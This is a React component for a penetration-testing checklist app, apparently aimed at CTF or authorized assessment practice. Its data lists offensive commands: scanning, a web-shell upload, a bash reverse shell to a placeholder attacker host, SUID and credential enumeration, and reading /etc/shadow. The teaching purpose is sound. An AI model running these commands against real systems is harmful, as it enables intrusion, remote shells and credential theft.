"use client";

import React, { useState, useEffect } from "react";
import {
  CheckSquare,
  Square,
  Shield,
  Terminal,
  Crosshair,
  Download,
  RotateCcw,
  Sparkles,
  Search,
  ExternalLink,
} from "lucide-react";
import Link from "next/link";

interface ChecklistItem {
  id: string;
  phase: string;
  title: string;
  commandSnippet?: string;
  notesDocSlug?: string;
}

const CHECKLIST_ITEMS: ChecklistItem[] = [
  // Phase 1: Recon
  {
    id: "rec-1",
    phase: "Reconnaissance & OSINT",
    title: "Full Port Sweep with Service Detection & Default NSE Scripts",
    commandSnippet: "nmap -sC -sV -p- --min-rate 1000 <TARGET_IP> -oN nmap_all_ports.txt",
    notesDocSlug: "web-attacks",
  },
  {
    id: "rec-2",
    phase: "Reconnaissance & OSINT",
    title: "Virtual Host (VHost) & Subdomain Discovery",
    commandSnippet: "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<TARGET_IP> -H 'Host: FUZZ.<DOMAIN>' -fs 1234",
  },
  {
    id: "rec-3",
    phase: "Reconnaissance & OSINT",
    title: "Web Technology Fingerprinting & Header Analysis",
    commandSnippet: "whatweb -a 3 http://<TARGET_IP> && curl -I http://<TARGET_IP>",
  },
  {
    id: "rec-4",
    phase: "Reconnaissance & OSINT",
    title: "Directory & Endpoint Bruteforcing",
    commandSnippet: "feroxbuster -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30",
  },

  // Phase 2: Web Attacks
  {
    id: "web-1",
    phase: "Web Application Assessment",
    title: "HTTP Verb Tampering & Insecure Methods Check (GET/POST/HEAD/OPTIONS)",
    commandSnippet: "curl -X OPTIONS -i http://<TARGET_IP>/api/admin",
    notesDocSlug: "web-attacks",
  },
  {
    id: "web-2",
    phase: "Web Application Assessment",
    title: "Insecure Direct Object Reference (IDOR) & Parameter Fuzzing",
    commandSnippet: "curl -H 'Cookie: session=analyst' http://<TARGET_IP>/api/documents/1",
    notesDocSlug: "web-attacks",
  },
  {
    id: "web-3",
    phase: "Web Application Assessment",
    title: "Authentication Bypass & Credential Stuffing / JWT Audit",
    commandSnippet: "jwt_tool <TOKEN> -X a",
  },
  {
    id: "web-4",
    phase: "Web Application Assessment",
    title: "SQL & Command Injection Boundary Testing",
    commandSnippet: "sqlmap -u 'http://<TARGET_IP>/search?q=test' --batch --dbs",
  },
  {
    id: "web-5",
    phase: "Web Application Assessment",
    title: "Arbitrary File Upload & Extension Filtering Bypass (.phtml, .php5)",
    commandSnippet: "curl -F 'file=@shell.phtml' http://<TARGET_IP>/upload.php",
  },

  // Phase 3: Exploitation
  {
    id: "exp-1",
    phase: "Exploitation & Initial Access",
    title: "Set up Multi-Platform Reverse Shell Listener",
    commandSnippet: "nc -lvnp 4444",
  },
  {
    id: "exp-2",
    phase: "Exploitation & Initial Access",
    title: "Deliver Staged Reverse Payload via Webhook / Endpoint",
    commandSnippet: "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1",
  },
  {
    id: "exp-3",
    phase: "Exploitation & Initial Access",
    title: "Upgrade Raw Dumb TTY Shell to Full Interactive PTY",
    commandSnippet: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' ; export TERM=xterm",
  },

  // Phase 4: PrivEsc
  {
    id: "priv-1",
    phase: "Linux Privilege Escalation",
    title: "Check Sudo Capabilities without Password",
    commandSnippet: "sudo -l",
    notesDocSlug: "linux-privilege-escalation",
  },
  {
    id: "priv-2",
    phase: "Linux Privilege Escalation",
    title: "Identify SUID / SGID Binaries Exploitable via GTFOBins",
    commandSnippet: "find / -perm -u=s -type f 2>/dev/null",
    notesDocSlug: "linux-privilege-escalation",
  },
  {
    id: "priv-3",
    phase: "Linux Privilege Escalation",
    title: "Inspect Scheduled Tasks & Modifiable Cron Jobs",
    commandSnippet: "cat /etc/crontab /etc/cron.* ; ls -la /etc/cron*",
    notesDocSlug: "linux-privilege-escalation",
  },
  {
    id: "priv-4",
    phase: "Linux Privilege Escalation",
    title: "Check File Capabilities (getcap)",
    commandSnippet: "getcap -r / 2>/dev/null",
    notesDocSlug: "linux-privilege-escalation",
  },
  {
    id: "priv-5",
    phase: "Linux Privilege Escalation",
    title: "Harvest Cleartext Passwords in Configs & History",
    commandSnippet: "grep -ri 'password' /var/www/ /opt/ 2>/dev/null ; cat ~/.bash_history",
    notesDocSlug: "linux-privilege-escalation",
  },

  // Phase 5: Post-Exploitation
  {
    id: "post-1",
    phase: "Post-Exploitation & Reporting",
    title: "Dump Shadow Hash / Sensitive Local Accounts",
    commandSnippet: "cat /etc/shadow 2>/dev/null || unshadow /etc/passwd /etc/shadow",
  },
  {
    id: "post-2",
    phase: "Post-Exploitation & Reporting",
    title: "Capture Proof of Access Flag & Timestamped Evidence",
    commandSnippet: "id && hostname && date && cat /root/root.txt",
  },
  {
    id: "post-3",
    phase: "Post-Exploitation & Reporting",
    title: "Sanitize & Remove Dropped Tools / Staging Directories",
    commandSnippet: "rm -rf /tmp/linpeas.sh /dev/shm/*",
  },
];

export function MethodologyClient() {
  const [checkedIds, setCheckedIds] = useState<Set<string>>(new Set());
  const [selectedPhase, setSelectedPhase] = useState<string>("all");
  const [searchFilter, setSearchFilter] = useState("");
  const [copiedId, setCopiedId] = useState<string | null>(null);

  useEffect(() => {
    if (typeof window !== "undefined") {
      const saved = localStorage.getItem("cyber_methodology_progress");
      if (saved) {
        try {
          setCheckedIds(new Set(JSON.parse(saved)));
        } catch {
          // ignore
        }
      }
    }
  }, []);

  const toggleCheck = (id: string) => {
    setCheckedIds((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);

      if (typeof window !== "undefined") {
        localStorage.setItem("cyber_methodology_progress", JSON.stringify(Array.from(next)));
      }
      return next;
    });
  };

  const resetAll = () => {
    if (confirm("Reset all checklist progress for this engagement?")) {
      setCheckedIds(new Set());
      if (typeof window !== "undefined") {
        localStorage.removeItem("cyber_methodology_progress");
      }
    }
  };

  const phases = Array.from(new Set(CHECKLIST_ITEMS.map((item) => item.phase)));

  const filteredItems = CHECKLIST_ITEMS.filter((item) => {
    const matchesPhase = selectedPhase === "all" || item.phase === selectedPhase;
    const matchesQuery =
      !searchFilter.trim() ||
      item.title.toLowerCase().includes(searchFilter.toLowerCase()) ||
      item.commandSnippet?.toLowerCase().includes(searchFilter.toLowerCase());
    return matchesPhase && matchesQuery;
  });

  const totalCount = CHECKLIST_ITEMS.length;
  const completedCount = checkedIds.size;
  const percentage = Math.round((completedCount / totalCount) * 100);

  const exportMarkdownReport = () => {
    let report = `# Penetration Testing Operational Assessment Log\n`;
    report += `Generated: ${new Date().toISOString()}\n`;
    report += `Overall Progress: ${completedCount}/${totalCount} (${percentage}%)\n\n`;

    phases.forEach((p) => {
      const phaseItems = CHECKLIST_ITEMS.filter((i) => i.phase === p);
      report += `## ${p}\n`;
      phaseItems.forEach((i) => {
        const checked = checkedIds.has(i.id) ? "[x]" : "[ ]";
        report += `- ${checked} **${i.title}**\n`;
        if (i.commandSnippet) {
          report += `  \`\`\`bash\n  ${i.commandSnippet}\n  \`\`\`\n`;
        }
      });
      report += `\n`;
    });

    const blob = new Blob([report], { type: "text/markdown;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = `pentest_assessment_progress_${Date.now()}.md`;
    link.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="space-y-6">
      {/* Overview Progress Card */}
      <div className="p-6 rounded-2xl glass-panel border-[#1f3352] space-y-4 relative overflow-hidden">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2 font-mono text-xs text-[#9fef00] mb-1">
              <Crosshair className="w-4 h-4" />
              <span>ENGAGEMENT EXECUTION MATRIX</span>
            </div>
            <h2 className="text-xl font-bold text-[#ffffff]">
              Methodology & Assessment Checklist
            </h2>
            <p className="text-xs text-[#a4b1cd]">
              Standardized tactics across Recon, Exploitation, and Privilege Escalation.
            </p>
          </div>

          <div className="flex items-center gap-2">
            <button
              type="button"
              onClick={exportMarkdownReport}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#14233c] hover:bg-[#182844] border border-[#1f3352] text-xs font-mono text-[#ffffff] transition-colors"
              title="Download assessment checklist as Markdown"
            >
              <Download className="w-3.5 h-3.5 text-[#9fef00]" />
              <span>Export Log</span>
            </button>
            <button
              type="button"
              onClick={resetAll}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#14233c] hover:bg-[#ff3366]/20 border border-[#1f3352] hover:border-[#ff3366]/40 text-xs font-mono text-[#8ba0c3] hover:text-[#ff3366] transition-colors"
              title="Reset all checkmarks"
            >
              <RotateCcw className="w-3.5 h-3.5" />
              <span>Reset</span>
            </button>
          </div>
        </div>

        {/* Global Progress Bar */}
        <div className="space-y-1.5 pt-2">
          <div className="flex items-center justify-between text-xs font-mono">
            <span className="text-[#8ba0c3]">
              Completed: <strong className="text-[#9fef00]">{completedCount}</strong> of {totalCount} items
            </span>
            <span className="text-[#9fef00] font-bold">{percentage}%</span>
          </div>
          <div className="w-full h-2 rounded-full bg-[#070b13] border border-[#1f3352] overflow-hidden">
            <div
              className="h-full bg-gradient-to-r from-[#9fef00] to-[#2de2e6] transition-all duration-300 shadow-[0_0_12px_rgba(159,239,0,0.5)]"
              style={{ width: `${percentage}%` }}
            />
          </div>
        </div>
      </div>

      {/* Filter and Phase Tabs */}
      <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-4 p-4 rounded-2xl border border-[#1f3352] glass-panel">
        <div className="relative flex-1 max-w-sm">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[#6c7d9c]" />
          <input
            type="text"
            value={searchFilter}
            onChange={(e) => setSearchFilter(e.target.value)}
            placeholder="Search checklists & commands..."
            className="w-full pl-9 pr-4 py-1.5 rounded-lg bg-[#111d30] border border-[#1f3352] text-xs font-mono text-[#ffffff] placeholder-[#6c7d9c] focus:border-[#9fef00] focus:outline-none"
          />
        </div>

        <div className="flex items-center gap-1.5 overflow-x-auto pb-1 text-xs font-mono">
          <button
            type="button"
            onClick={() => setSelectedPhase("all")}
            className={`px-3 py-1 rounded-lg border transition-colors cursor-pointer ${
              selectedPhase === "all"
                ? "bg-[#9fef00]/15 text-[#9fef00] border-[#9fef00]/50 font-semibold"
                : "bg-[#14233c] text-[#8ba0c3] border-[#1f3352] hover:text-[#ffffff]"
            }`}
          >
            All Phases
          </button>
          {phases.map((p) => {
            const pItems = CHECKLIST_ITEMS.filter((i) => i.phase === p);
            const pChecked = pItems.filter((i) => checkedIds.has(i.id)).length;
            return (
              <button
                key={p}
                type="button"
                onClick={() => setSelectedPhase(p)}
                className={`px-2.5 py-1 rounded-lg border transition-colors whitespace-nowrap cursor-pointer ${
                  selectedPhase === p
                    ? "bg-[#9fef00]/15 text-[#9fef00] border-[#9fef00]/50 font-semibold"
                    : "bg-[#14233c] text-[#8ba0c3] border-[#1f3352] hover:text-[#ffffff]"
                }`}
              >
                <span>{p.split(" ")[0]}</span>
                <span className="text-[10px] text-[#6c7d9c] ml-1">
                  ({pChecked}/{pItems.length})
                </span>
              </button>
            );
          })}
        </div>
      </div>

      {/* Checklist Items Accordion / Cards */}
      <div className="space-y-3">
        {filteredItems.map((item) => {
          const isDone = checkedIds.has(item.id);
          return (
            <div
              key={item.id}
              className={`p-4 rounded-xl border transition-all ${
                isDone
                  ? "bg-[#9fef00]/5 border-[#9fef00]/40"
                  : "glass-panel border-[#1f3352] hover:border-[#9fef00]/40"
              }`}
            >
              <div className="flex items-start gap-3">
                <button
                  type="button"
                  onClick={() => toggleCheck(item.id)}
                  className="mt-0.5 text-[#9fef00] flex-shrink-0 cursor-pointer"
                  title={isDone ? "Mark incomplete" : "Mark completed"}
                >
                  {isDone ? (
                    <CheckSquare className="w-5 h-5 fill-[#9fef00]/20" />
                  ) : (
                    <Square className="w-5 h-5 text-[#6c7d9c] hover:text-[#9fef00]" />
                  )}
                </button>

                <div className="flex-1 min-w-0 space-y-2">
                  <div className="flex flex-wrap items-center justify-between gap-2">
                    <span
                      onClick={() => toggleCheck(item.id)}
                      className={`text-sm font-semibold cursor-pointer transition-colors ${
                        isDone ? "line-through text-[#6c7d9c]" : "text-[#ffffff]"
                      }`}
                    >
                      {item.title}
                    </span>

                    <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-[#111d30] border border-[#1f3352] text-[#8ba0c3]">
                      {item.phase}
                    </span>
                  </div>

                  {item.commandSnippet && (
                    <div className="flex items-center justify-between gap-2 p-2 rounded-lg bg-[#070b13] border border-[#1f3352] font-mono text-xs">
                      <code className="text-[#9fef00] truncate">{item.commandSnippet}</code>
                      <button
                        type="button"
                        onClick={() => {
                          navigator.clipboard.writeText(item.commandSnippet!);
                          setCopiedId(item.id);
                          setTimeout(() => setCopiedId(null), 1800);
                        }}
                        className="p-1 text-[#6c7d9c] hover:text-[#ffffff] flex-shrink-0"
                        title="Copy command"
                      >
                        {copiedId === item.id ? (
                          <span className="text-[10px] text-[#9fef00]">Copied!</span>
                        ) : (
                          <Terminal className="w-3.5 h-3.5" />
                        )}
                      </button>
                    </div>
                  )}

                  {item.notesDocSlug && (
                    <div className="pt-1">
                      <Link
                        href={`/notes/${item.notesDocSlug}`}
                        className="inline-flex items-center gap-1 text-[11px] font-mono text-[#2de2e6] hover:underline"
                      >
                        <span>Read reference writeup</span>
                        <ExternalLink className="w-3 h-3" />
                      </Link>
                    </div>
                  )}
                </div>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}
